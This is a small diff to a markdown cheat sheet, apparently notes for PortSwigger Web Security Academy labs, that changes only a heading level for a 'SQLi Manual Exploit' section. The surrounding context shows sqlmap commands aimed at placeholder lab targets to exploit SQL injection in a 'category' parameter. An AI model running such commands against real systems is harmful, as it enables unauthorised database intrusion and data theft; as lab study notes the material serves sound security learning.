@@ -438,7 +438,7 @@ sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "cat
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
 ```  
 
-## SQLi Manual Exploit  
+### SQLi Manual Exploit  
 
 >SQL injection vulnerability exploited manually by first finding list of **tables** in the database.  
 
